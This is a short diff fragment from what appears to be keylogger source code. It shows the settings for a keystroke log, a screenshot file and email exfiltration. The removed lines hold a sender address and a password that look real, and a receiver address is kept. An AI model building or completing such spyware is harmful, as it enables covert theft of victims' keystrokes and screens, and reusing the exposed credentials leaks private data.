@@ -16,8 +16,8 @@ class Keylogger:
     def __init__(self):
         self.log_file = "keylog.txt"
         self.screenshot_file = "screenshot.jpg"
-        self.sender_email = "abdulfaro@telegmail.com"
-        self.password = "KWU1gpfYMASZcmND"
+        self.sender_email = "email@email.com"
+        self.password = "email_password"
         self.receiver_email = "abdulfarooqf8@gmail.com"
 
     def start(self):
